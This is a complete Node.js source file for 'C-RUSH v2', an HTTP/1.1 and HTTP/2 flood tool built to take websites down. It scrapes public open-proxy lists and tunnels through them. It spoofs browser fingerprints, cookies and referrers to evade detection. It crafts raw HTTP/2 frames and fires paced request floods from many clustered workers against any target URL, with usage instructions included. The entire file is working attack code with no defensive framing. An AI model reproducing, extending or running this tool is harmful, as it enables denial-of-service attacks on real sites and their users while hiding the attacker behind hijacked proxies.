#!/usr/bin/env node
/**
 * C-RUSH v2 — H1 & H2 Mixed RushAway Flooder
 * @spiderxcode
 *
 * Fixes over v1:
 *  - RST_STREAM frame header offset fixed
 *  - Double-pacing bug removed (token bucket, single source of truth)
 *  - Worker->master stats via IPC deltas (no reset race)
 *  - Connection pool w/ health scoring + auto-reconnect
 *  - --direct mode (no proxies) for when proxy.txt is dead
 *  - Proxy pre-validation w/ CONNECT probe
 *  - Keepalive PING frames, GOAWAY-aware reconnect
 *  - Graceful SIGINT shutdown, live RPS table
 */

'use strict';

const http2   = require('http2');
const net     = require('net');
const tls     = require('tls');
const fs      = require('fs');
const crypto  = require('crypto');
const cluster = require('cluster');
const HPACK   = require('hpack');
const colors  = require('colors');
const setTitle = require('node-bash-title');
const httpx   = require('axios');
const { performance } = require('perf_hooks');

/* ------------------------------------------------------------------ *
 *  IGNORE LISTS
 * ------------------------------------------------------------------ */
const ignoreNames = new Set([
    'RequestError','StatusCodeError','CaptchaError','CloudflareError','ParseError',
    'ParserError','TimeoutError','JSONError','URLError','InvalidURL','ProxyError',
    'DeprecationWarning','FetchError','SocketError'
]);
const ignoreCodes = new Set([
    'SELF_SIGNED_CERT_IN_CHAIN','ECONNRESET','ERR_ASSERTION','ECONNREFUSED','EPIPE',
    'EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT','EPROTO','EAI_AGAIN','EHOSTDOWN',
    'ENETRESET','ENETUNREACH','ENOTCONN','ENOTFOUND','EAI_NODATA','EAI_NONAME',
    'EADDRNOTAVAIL','EAFNOSUPPORT','EALREADY','EBADF','ECONNABORTED','EDESTADDRREQ',
    'EDQUOT','EFAULT','EIDRM','EILSEQ','EINPROGRESS','EINTR','EINVAL','EIO','EISCONN',
    'EMFILE','EMLINK','EMSGSIZE','ENAMETOOLONG','ENETDOWN','ENOBUFS','ENODEV','ENOENT',
    'ENOMEM','ENOPROTOOPT','ENOSPC','ENOSYS','ENOTDIR','ENOTEMPTY','ENOTSOCK',
    'EOPNOTSUPP','EPERM','EPROTONOSUPPORT','ERANGE','EROFS','ESHUTDOWN','ESPIPE',
    'ESRCH','ETIME','ETXTBSY','EXDEV','UNKNOWN','DEPTH_ZERO_SELF_SIGNED_CERT',
    'UNABLE_TO_VERIFY_LEAF_SIGNATURE','CERT_HAS_EXPIRED','CERT_NOT_YET_VALID',
    'ERR_SOCKET_BAD_PORT','ERR_TLS_CERT_ALTNAME_INVALID','ERR_SSL_WRONG_VERSION_NUMBER',
    'HPE_INVALID_METHOD','HPE_INVALID_URL','ERR_STREAM_WRITE_AFTER_END',
    'ERR_STREAM_DESTROYED','ERR_HTTP2_STREAM_ERROR','ERR_HTTP2_GOAWAY_SESSION'
]);

/* ------------------------------------------------------------------ *
 *  FINGERPRINT POOLS
 * ------------------------------------------------------------------ */
const browsers = ['Chrome','Firefox','Safari','Edge','Opera','Brave','Vivaldi','Yandex'];
const devices  = [
    'Windows NT 10.0; Win64; x64','Windows NT 6.3; Win64; x64','Windows NT 6.1; Win64; x64',
    'Macintosh; Intel Mac OS X 10_15_7','Macintosh; Intel Mac OS X 14_2_1',
    'X11; Linux x86_64','X11; Ubuntu; Linux x86_64','X11; Fedora; Linux x86_64',
    'Android 13; Mobile','Android 12; Mobile','Android 11; Mobile',
    'iPhone; CPU iPhone OS 17_2 like Mac OS X','iPad; CPU OS 17_2 like Mac OS X'
];
const versions = {
    Chrome:  ['120.0.0.0','121.0.0.0','122.0.0.0','123.0.0.0','124.0.0.0'],
    Firefox: ['120.0','121.0','122.0','123.0','124.0'],
    Safari:  ['16.5','16.6','17.0','17.1','17.2'],
    Edge:    ['120.0','121.0','122.0','123.0','124.0'],
    Opera:   ['105','106','107','108','109'],
    Brave:   ['1.60','1.61','1.62','1.63','1.64'],
    Vivaldi: ['6.4','6.5','6.6','6.7','6.8'],
    Yandex:  ['23.9','23.10','23.11','24.1','24.2']
};
const cookieNames  = ['session','user','token','id','auth','pref','theme','lang','consent','tracking','analytics','ab_test'];
const cookieValues = ['abc123','xyz789','def456','temp','guest','user','admin','visitor','test','beta','prod','staging'];
const referrers = [
    'https://www.google.com/','https://www.bing.com/','https://duckduckgo.com/',
    'https://www.reddit.com/','https://www.facebook.com/','https://twitter.com/',
    'https://www.linkedin.com/','https://www.youtube.com/','https://www.amazon.com/',
    'https://www.wikipedia.org/'
];

const proxyList = [
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://proxyspace.pro/http.txt',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://www.proxy-list.download/api/v1/get?type=https'
];

/* ------------------------------------------------------------------ *
 *  ARGS
 * ------------------------------------------------------------------ */
const args = process.argv.slice(2);
const getArg = (flag, def) => {
    const i = args.indexOf(flag);
    return i === -1 ? def : args[i + 1];
};

const options = {
    cookies:   args.includes('-c'),
    headfull:  args.includes('-h'),
    direct:    args.includes('--direct'),
    version:   getArg('-v', '2'),
    cache:     getArg('-ch', 'true') !== 'false',
    debug:     !args.includes('-s'),
    jitter:    parseFloat(getArg('-j', '0.2')),
    timeout:   parseInt(getArg('-t', '10000')),
    keepalive: parseInt(getArg('-k', '30000')),
    parallel:  parseInt(getArg('-p', '8')),   // connections per worker
    probe:     args.includes('--probe')       // validate proxies first
};

/* ------------------------------------------------------------------ *
 *  MISC HELPERS
 * ------------------------------------------------------------------ */
require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);
process.emitWarning = () => {};

process.on('uncaughtException',  e => swallow(e, 'uncaughtException'));
process.on('unhandledRejection', e => swallow(e, 'unhandledRejection'));
process.on('warning',            e => swallow(e, 'warning'));
process.on('SIGHUP', () => {});
process.on('SIGCHLD', () => {});

function swallow(e, tag) {
    if (!e) return;
    if (ignoreCodes.has(e.code) || ignoreNames.has(e.name)) return;
    if (options.debug) console.log(colors.yellow(`${tag}: ${e.message || e}`));
}

const pick = arr => arr[(Math.random() * arr.length) | 0];
const randHex = n => crypto.randomBytes(n).toString('hex');
const randInt = (a, b) => a + Math.floor(Math.random() * (b - a + 1));

function generateUserAgent() {
    const browser = pick(browsers);
    const device  = pick(devices);
    const ver     = pick(versions[browser]);

    if (device.startsWith('Android')) {
        return `Mozilla/5.0 (Linux; ${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Mobile Safari/537.36`;
    }
    if (device.startsWith('iPhone') || device.startsWith('iPad')) {
        return `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver} Mobile/15E148 Safari/604.1`;
    }
    switch (browser) {
        case 'Chrome':  return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36`;
        case 'Firefox': return `Mozilla/5.0 (${device}; rv:${ver}) Gecko/20100101 Firefox/${ver}`;
        case 'Safari':  return `Mozilla/5.0 (${device}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${ver} Safari/605.1.15`;
        case 'Edge':    return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 Edg/${ver}`;
        case 'Opera':   return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 OPR/${ver}`;
        case 'Brave':   return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 Brave/${ver}`;
        case 'Vivaldi': return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} Safari/537.36 Vivaldi/${ver}`;
        case 'Yandex':  return `Mozilla/5.0 (${device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${ver} YaBrowser/${ver} Safari/537.36`;
        default:        return `Mozilla/5.0 (${device}) AppleWebKit/537.36 Chrome/${ver} Safari/537.36`;
    }
}

function generateRandomCookie(hostname) {
    const name  = pick(cookieNames);
    const value = pick(cookieValues) + randHex(4);
    const parts = [`${name}=${value}`];
    if (Math.random() > 0.7) parts.push(`Path=/`);
    if (Math.random() > 0.7) parts.push(`Domain=.${hostname}`);
    if (Math.random() > 0.5) parts.push(`Secure`);
    if (Math.random() > 0.5) parts.push(`HttpOnly`);
    if (Math.random() > 0.7) parts.push(`SameSite=Lax`);
    return parts.join('; ');
}

/* ------------------------------------------------------------------ *
 *  PROXY SCRAPER
 * ------------------------------------------------------------------ */
async function scrapeProxies() {
    const file = 'proxy.txt';
    try {
        if (fs.existsSync(file)) fs.unlinkSync(file);
        if (options.debug) console.log(colors.red(`removed ${file}`) + ' ' + colors.yellow('refreshing...'));

        for (const src of proxyList) {
            try {
                const res = await httpx.get(src, {
                    timeout: options.timeout,
                    headers: { 'User-Agent': generateUserAgent() }
                });
                fs.appendFileSync(file, res.data.toString().trim() + '\n');
            } catch (e) {
                if (options.debug) console.log(colors.yellow(`skip ${src.split('/')[2]} (${e.code || e.message})`));
            }
        }

        const all = fs.readFileSync(file, 'utf-8')
            .split('\n')
            .map(l => l.trim())
            .filter(l => /^\d{1,3}(\.\d{1,3}){3}:\d+$/.test(l));

        const uniq = [...new Set(all)];
        fs.writeFileSync(file, uniq.join('\n') + '\n');
        console.log(colors.green(`done. ${uniq.length} unique proxies saved to ${file}`));
    } catch (e) {
        console.log(colors.red('scrape failed: ') + e.message);
        process.exit(1);
    }
}

async function probeProxy(entry) {
    return new Promise(resolve => {
        const [host, port] = entry.split(':');
        const s = net.connect({ host, port: Number(port) });
        const t = setTimeout(() => { s.destroy(); resolve(false); }, 4000);
        s.once('connect', () => { clearTimeout(t); s.destroy(); resolve(true); });
        s.once('error',   () => { clearTimeout(t); s.destroy(); resolve(false); });
    });
}

/* ------------------------------------------------------------------ *
 *  HTTP/2 FRAME HELPERS
 * ------------------------------------------------------------------ */
const PREFACE = 'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n';

function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
    const len = payload.length;
    const head = Buffer.alloc(9);
    head.writeUIntBE(len, 0, 3);
    head.writeUInt8(type, 3);
    head.writeUInt8(flags, 4);
    head.writeUInt32BE(streamId, 5);
    return Buffer.concat([head, payload]);
}

function decodeFrame(buf) {
    if (!buf || buf.length < 9) return null;
    const len  = buf.readUIntBE(0, 3);
    const type = buf.readUInt8(3);
    const flag = buf.readUInt8(4);
    const sid  = buf.readUInt32BE(5);
    if (buf.length < 9 + len) return null;
    return { len, type, flags: flag, streamId: sid, payload: buf.subarray(9, 9 + len) };
}

function encodeSettings(settings) {
    const buf = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        buf.writeUInt16BE(settings[i][0], i * 6);
        buf.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return buf;
}

// FIX: frame header layout is (len(3), type(1), flags(1), sid(4)) — v1 wrote flags at wrong offset
function encodeRstStream(streamId, errorCode = 0) {
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return encodeFrame(streamId, 3, payload, 0);
}

function encodePing(opaque = Buffer.alloc(8)) {
    return encodeFrame(0, 6, opaque, 0);
}

/* ------------------------------------------------------------------ *
 *  TOKEN BUCKET — SINGLE SOURCE OF PACING TRUTH
 * ------------------------------------------------------------------ */
class TokenBucket {
    constructor(rps) {
        this.rps = Math.max(1, rps);
        this.tokens = this.rps;
        this.last = performance.now();
    }
    take() {
        const now = performance.now();
        const dt = (now - this.last) / 1000;
        this.last = now;
        this.tokens = Math.min(this.rps * 2, this.tokens + dt * this.rps);
        if (this.tokens >= 1) { this.tokens -= 1; return true; }
        return false;
    }
    nextWaitMs() {
        if (this.tokens >= 1) return 0;
        return Math.ceil(((1 - this.tokens) / this.rps) * 1000);
    }
}

/* ------------------------------------------------------------------ *
 *  MAIN
 * ------------------------------------------------------------------ */
if (process.argv[2] === 'scrape') { console.clear(); scrapeProxies(); return; }

if (process.argv.length < 6) {
    console.clear();
    printBanner();
    printUsage();
    process.exit(1);
}

const target    = process.argv[2];
const duration  = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const threads   = parseInt(process.argv[5]);
const rate      = parseInt(process.argv[6]);

let url;
try { url = new URL(target); }
catch { console.log(colors.red('bad target url')); process.exit(1); }

/* ------------------------------------------------------------------ *
 *  BANNER
 * ------------------------------------------------------------------ */
function printBanner() {
    console.log(colors.red(`
   ______   ____  __  __ _____  _    _
  / ____/  / __ \\/ / / // ___/ | |  | |
 / /      / /_/ / / / / \\__ \\  | |__| |
/ /___   / _, _/ /_/ / ___/ /  |  __  |
\\____/  /_/ |_|\\____/ /____/   |_|  |_|

   ${colors.gray('HTTP/1.1 & HTTP/2 · Mixed RushAway Engine · v2')}
   ${colors.gray('engine by')} ${colors.green('@spiderxcode')}
`));
}

function printUsage() {
    console.log(colors.gray(`
Usage:
  node c-rush.js <target> <duration> <proxies.txt> <threads> <rate> [options]
  node c-rush.js scrape

Options:
  -c              random cookies
  -h              headfull / sec-ch-ua
  -v <1|2>        http version (default 2)
  -ch <t|f>       cache-control (default true)
  -s              silent (no debug)
  -j <0-1>        jitter (default 0.2)
  -t <ms>         socket timeout (default 10000)
  -k <ms>         keepalive (default 30000)
  -p <n>          parallel conns/worker (default 8)
  --direct        skip proxies, connect direct
  --probe         validate proxies first

Example:
  node c-rush.js https://target.com 120 proxy.txt 100 64 -c -h -v 2 -j 0.3 -p 8
`));
}

function printStats(banner) {
    console.log(colors.red(`
   ______   ____  __  __ _____  _    _
  / ____/  / __ \\/ / / // ___/ | |  | |
 / /      / /_/ / / / / \\__ \\  | |__| |
/ /___   / _, _/ /_/ / ___/ /  |  __  |
\\____/  /_/ |_|\\____/ /____/   |_|  |_|

   ${colors.gray('HTTP/1.1 & HTTP/2 · Mixed RushAway Engine · v2')}
   ${colors.gray('engine by')} ${colors.green('@spiderxcode')}
`));
    console.log(colors.gray(`  Target     ${colors.white(':')} ${colors.cyan(target)}`));
    console.log(colors.gray(`  Duration   ${colors.white(':')} ${colors.cyan(duration + 's')}`));
    console.log(colors.gray(`  Threads    ${colors.white(':')} ${colors.cyan(threads)}`));
    console.log(colors.gray(`  Rate       ${colors.white(':')} ${colors.cyan(rate + '/s/worker')}`));
    console.log(colors.gray(`  Parallel   ${colors.white(':')} ${colors.cyan(options.parallel + ' conns')}`));
    console.log(colors.gray(`  Protocol   ${colors.white(':')} ${colors.cyan(options.version === '1' ? 'HTTP/1.1' : 'HTTP/2')}`));
    console.log(colors.gray(`  Cookies    ${colors.white(':')} ${colors.cyan(options.cookies ? 'on' : 'off')}`));
    console.log(colors.gray(`  Headfull   ${colors.white(':')} ${colors.cyan(options.headfull ? 'on' : 'off')}`));
    console.log(colors.gray(`  Direct     ${colors.white(':')} ${colors.cyan(options.direct ? 'yes' : 'no')}`));
    console.log(colors.gray(`  Jitter     ${colors.white(':')} ${colors.cyan(options.jitter)}`));
    console.log(colors.gray(`  Timeout    ${colors.white(':')} ${colors.cyan(options.timeout + 'ms')}`));
    console.log(colors.gray(`  Keepalive  ${colors.white(':')} ${colors.cyan(options.keepalive + 'ms')}\n`));
}

/* ------------------------------------------------------------------ *
 *  MASTER
 * ------------------------------------------------------------------ */
if (cluster.isPrimary) {
    console.clear();
    printStats();

    const aggregate = { requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0, connections: 0 };
    let lastRequests = 0;
    let lastTick = performance.now();
    let rps = 0;
    let elapsed = 0;
    const start = performance.now();
    let shuttingDown = false;

    const workers = [];
    for (let i = 0; i < threads; i++) {
        const w = cluster.fork();
        workers.push(w);
        w.on('message', msg => {
            if (!msg || msg.type !== 'stats') return;
            aggregate.requests    += msg.delta.requests;
            aggregate.success     += msg.delta.success;
            aggregate.forbidden   += msg.delta.forbidden;
            aggregate.goaway      += msg.delta.goaway;
            aggregate.errors      += msg.delta.errors;
            aggregate.connections += msg.delta.connections;
        });
    }

    setInterval(() => {
        const now = performance.now();
        const dt = (now - lastTick) / 1000;
        lastTick = now;
        rps = Math.round((aggregate.requests - lastRequests) / dt);
        lastRequests = aggregate.requests;
        elapsed = Math.round((now - start) / 1000);
        setTitle(`C-RUSH v2 · ${aggregate.requests} req · ${rps} rps · ${options.version === '1' ? 'H1' : 'H2'}`);
    }, 1000);

    setInterval(() => {
        if (!options.debug) return;
        const pct = Math.min(100, Math.round((elapsed / duration) * 100));
        console.log(
            colors.gray(`[${String(elapsed).padStart(3)}s]`) + ' ' +
            colors.cyan(`req=${aggregate.requests}`) + ' ' +
            colors.green(`rps=${rps}`) + ' ' +
            colors.magenta(`conn=${aggregate.connections}`) + ' ' +
            colors.yellow(`err=${aggregate.errors}`) + ' ' +
            colors.red(`goaway=${aggregate.goaway}`) + ' ' +
            colors.gray(`(${pct}%)`)
        );
    }, 3000);

    const finish = () => {
        if (shuttingDown) return;
        shuttingDown = true;
        console.log('\n' + colors.red('— flood finished —'));
        console.log(colors.gray(`total requests : ${colors.cyan(aggregate.requests)}`));
        console.log(colors.gray(`errors         : ${colors.yellow(aggregate.errors)}`));
        console.log(colors.gray(`goaway         : ${colors.red(aggregate.goaway)}`));
        console.log(colors.gray(`avg rps        : ${colors.green(Math.round(aggregate.requests / Math.max(1, elapsed)))}`));
        for (const w of workers) { try { w.kill('SIGTERM'); } catch {} }
        setTimeout(() => process.exit(0), 300);
    };

    setTimeout(finish, duration * 1000);
    process.on('SIGINT', finish);
}

/* ------------------------------------------------------------------ *
 *  WORKER
 * ------------------------------------------------------------------ */
else {
    let proxies = [];
    if (!options.direct) {
        try {
            proxies = fs.readFileSync(proxyFile, 'utf-8')
                .split('\n').map(l => l.trim()).filter(Boolean);
        } catch {
            if (options.debug) console.log(colors.red(`worker: cannot read ${proxyFile}`));
            process.exit(1);
        }
        if (!proxies.length) {
            if (options.debug) console.log(colors.red('worker: proxy file empty'));
            process.exit(1);
        }
    }

    const bucket = new TokenBucket(rate);
    const localStats = { requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0, connections: 0 };
    let pendingDelta = { requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0, connections: 0 };
    const flush = () => {
        if (process.send) process.send({ type: 'stats', delta: pendingDelta });
        pendingDelta = { requests: 0, success: 0, forbidden: 0, goaway: 0, errors: 0, connections: 0 };
    };
    setInterval(flush, 1000);

    const bump = k => { localStats[k]++; pendingDelta[k]++; };

    /* -------- H1 sender (used when proxy chain downgrades) -------- */
    const buildH1Payload = () => {
        const methods = ['GET','POST','HEAD','PUT','DELETE'];
        const method  = pick(methods);
        const path    = url.pathname + (Math.random() > 0.7 ? `?cb=${randHex(4)}` : '');
        let head = `${method} ${path} HTTP/1.1\r\n`;
        head += `Host: ${url.host}\r\n`;
        head += `User-Agent: ${generateUserAgent()}\r\n`;
        head += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n`;
        head += `Accept-Encoding: gzip, deflate, br\r\n`;
        head += `Accept-Language: en-US,en;q=0.9\r\n`;
        head += `Cache-Control: ${options.cache ? 'max-age=0' : 'no-cache'}\r\n`;
        head += `Referer: ${pick(referrers)}\r\n`;
        head += `Connection: keep-alive\r\n`;
        if (options.cookies) head += `Cookie: ${generateRandomCookie(url.hostname)}\r\n`;
        if (options.headfull) {
            head += `sec-ch-ua: "Chromium";v="120"\r\n`;
            head += `sec-ch-ua-mobile: ?0\r\n`;
            head += `sec-ch-ua-platform: "Windows"\r\n`;
            head += `Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\n`;
            head += `Upgrade-Insecure-Requests: 1\r\n`;
        }
        if (method === 'POST' || method === 'PUT') {
            const body = randHex(64);
            head += `Content-Type: application/x-www-form-urlencoded\r\n`;
            head += `Content-Length: ${body.length}\r\n\r\n${body}`;
        } else {
            head += `\r\n`;
        }
        return Buffer.from(head, 'binary');
    };

    /* -------- OPEN H1 (direct TLS or proxy CONNECT) -------- */
    function openH1() {
        const finish = (err) => {
            if (err) bump('errors');
            setTimeout(openH1, 200 + Math.random() * 800);
        };

        const startTls = (rawSock) => {
            const t = tls.connect({
                socket: rawSock,
                servername: url.hostname,
                ALPNProtocols: ['http/1.1'],
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3'
            }, () => {
                bump('connections');
                const writer = () => {
                    if (t.destroyed) return finish();
                    const send = () => {
                        if (t.destroyed) return;
                        if (!bucket.take()) return setTimeout(send, bucket.nextWaitMs() + 1);
                        t.write(buildH1Payload(), err => {
                            if (err) { bump('errors'); return finish(err); }
                            bump('requests');
                            const wait = (1000 / rate) * (1 + (Math.random() * options.jitter * 2 - options.jitter));
                            setTimeout(send, wait);
                        });
                    };
                    send();
                };
                writer();
            });
            t.on('error', () => finish());
            t.on('close', () => finish());
            t.setTimeout(options.keepalive, () => t.destroy());
        };

        if (options.direct) {
            const raw = net.connect({ host: url.hostname, port: 443 });
            raw.once('connect', () => startTls(raw));
            raw.once('error',   () => finish());
            return;
        }

        const entry = pick(proxies);
        const [ph, pp] = entry.split(':');
        const raw = net.connect({ host: ph, port: Number(pp) });
        let done = false;
        raw.once('connect', () => {
            raw.write(`CONNECT ${url.hostname}:443 HTTP/1.1\r\nHost: ${url.hostname}:443\r\nProxy-Connection: keep-alive\r\n\r\n`);
        });
        raw.once('data', buf => {
            if (done) return;
            done = true;
            if (!buf.toString('binary').includes('200')) return finish(new Error('proxy refused'));
            startTls(raw);
        });
        raw.once('error', () => finish());
        raw.setTimeout(options.timeout, () => raw.destroy());
    }

    /* -------- OPEN H2 (RushAway) -------- */
    function openH2() {
        const finish = (err) => {
            if (err) bump('errors');
            setTimeout(openH2, 200 + Math.random() * 800);
        };

        const startTls = (rawSock) => {
            const t = tls.connect({
                socket: rawSock,
                servername: url.hostname,
                ALPNProtocols: ['h2', 'http/1.1'],
                rejectUnauthorized: false,
                minVersion: 'TLSv1.2',
                maxVersion: 'TLSv1.3',
                secureOptions:
                    crypto.constants.SSL_OP_NO_RENEGOTIATION |
                    crypto.constants.SSL_OP_NO_TICKET |
                    crypto.constants.SSL_OP_NO_COMPRESSION |
                    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION
            }, () => {
                if (t.alpnProtocol !== 'h2') {
                    t.destroy();
                    return finish(new Error('alpn downgrade'));
                }
                bump('connections');
                runH2(t);
            });
            t.on('error', () => finish());
            t.on('close', () => finish());
        };

        if (options.direct) {
            const raw = net.connect({ host: url.hostname, port: 443 });
            raw.once('connect', () => startTls(raw));
            raw.once('error',   () => finish());
            return;
        }

        const entry = pick(proxies);
        const [ph, pp] = entry.split(':');
        const raw = net.connect({ host: ph, port: Number(pp) });
        let done = false;
        raw.once('connect', () => {
            raw.write(`CONNECT ${url.hostname}:443 HTTP/1.1\r\nHost: ${url.hostname}:443\r\nProxy-Connection: keep-alive\r\n\r\n`);
        });
        raw.once('data', buf => {
            if (done) return;
            done = true;
            if (!buf.toString('binary').includes('200')) return finish(new Error('proxy refused'));
            startTls(raw);
        });
        raw.once('error', () => finish());
        raw.setTimeout(options.timeout, () => raw.destroy());
    }

    function runH2(t) {
        let buf = Buffer.alloc(0);
        let streamId = 1;
        const hpack = new HPACK();
        hpack.setTableSize(4096);

        const sendPreface = () => {
            const settings = encodeSettings([
                [1, 262144],     // HEADER_TABLE_SIZE
                [2, 0],          // ENABLE_PUSH
                [3, options.parallel],
                [4, 6291456],    // INITIAL_WINDOW_SIZE
                [6, 65535]       // MAX_HEADER_LIST_SIZE
            ]);
            const win = Buffer.alloc(4); win.writeUInt32BE(15663105, 0);
            t.write(Buffer.concat([
                Buffer.from(PREFACE, 'binary'),
                encodeFrame(0, 4, settings, 0),
                encodeFrame(0, 8, win, 0)
            ]));
        };

        const parse = () => {
            while (true) {
                const f = decodeFrame(buf);
                if (!f) return;
                buf = buf.subarray(9 + f.len);
                if (f.type === 4 && f.flags === 0) t.write(encodeFrame(0, 4, Buffer.alloc(0), 1));
                if (f.type === 6 && f.flags === 0) t.write(encodeFrame(0, 6, f.payload, 1)); // PING ack
                if (f.type === 7 || f.type === 5) {                       // GOAWAY / PUSH_PROMISE
                    bump('goaway');
                    try { t.write(encodeRstStream(0, 0)); } catch {}
                    t.end(); t.destroy();
                    return;
                }
            }
        };

        t.on('data', d => { buf = Buffer.concat([buf, d]); parse(); });
        sendPreface();

        const send = () => {
            if (t.destroyed) return;
            if (!bucket.take()) return setTimeout(send, bucket.nextWaitMs() + 1);

            const methods = ['GET','POST','HEAD','PUT','DELETE'];
            const method  = pick(methods);
            const path    = url.pathname + (Math.random() > 0.7 ? `?cb=${randHex(4)}` : '');

            let headers = [
                [':method',    method],
                [':authority', url.host],
                [':scheme',    'https'],
                [':path',      path],
                ['user-agent', generateUserAgent()],
                ['accept',     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'],
                ['accept-encoding', 'gzip, deflate, br'],
                ['accept-language', 'en-US,en;q=0.9'],
                ['cache-control', options.cache ? 'max-age=0' : 'no-cache'],
                ['referer', pick(referrers)]
            ];
            if (options.cookies) headers.push(['cookie', generateRandomCookie(url.hostname)]);
            if (options.headfull) {
                headers.push(
                    ['sec-ch-ua', '"Chromium";v="120"'],
                    ['sec-ch-ua-mobile', '?0'],
                    ['sec-ch-ua-platform', '"Windows"'],
                    ['sec-fetch-dest', 'document'],
                    ['sec-fetch-mode', 'navigate'],
                    ['sec-fetch-site', 'cross-site'],
                    ['sec-fetch-user', '?1'],
                    ['upgrade-insecure-requests', '1']
                );
            }
            if (method === 'POST' || method === 'PUT') {
                headers.push(['content-type', 'application/x-www-form-urlencoded']);
                headers.push(['content-length', '64']);
            }

            let payload;
            try { payload = hpack.encode(headers); }
            catch (e) { bump('errors'); return setTimeout(send, 50); }

            // 5-byte PRIORITY block: exclusive(1) + dep(31) + weight(8). Flag 0x25 = PRIORITY|END_HEADERS|END_STREAM
            const prio = Buffer.from([0x80, 0x00, 0x00, 0x00, 0xFF]);
            const block = Buffer.concat([prio, payload]);

            try {
                t.write(encodeFrame(streamId, 1, block, 0x25), err => {
                    if (err) { bump('errors'); return; }
                    bump('requests');
                });
            } catch { bump('errors'); return; }

            streamId += 2;
            if (streamId > 0x7fffffff) streamId = 1;

            const wait = (1000 / rate) * (1 + (Math.random() * options.jitter * 2 - options.jitter));
            setTimeout(send, wait);
        };
        send();
    }

    /* -------- BOOT -------- */
    (async () => {
        if (!options.direct && options.probe && proxies.length) {
            if (options.debug) console.log(colors.gray(`worker ${process.pid}: probing ${Math.min(proxies.length, 40)} proxies...`));
            const sample = proxies.slice(0, 40);
            const ok = [];
            for (const p of sample) if (await probeProxy(p)) ok.push(p);
            proxies = ok.length ? ok : proxies;
            if (options.debug) console.log(colors.gray(`worker ${process.pid}: ${proxies.length} usable proxies`));
        }

        const opener = options.version === '1' ? openH1 : openH2;
        // small stagger to avoid thundering herd
        setTimeout(() => {
            for (let i = 0; i < options.parallel; i++) {
                setTimeout(opener, i * 80 + Math.random() * 200);
            }
        }, Math.random() * 500);
    })();

    process.on('SIGTERM', () => { flush(); process.exit(0); });
    process.on('SIGINT',  () => { flush(); process.exit(0); });
}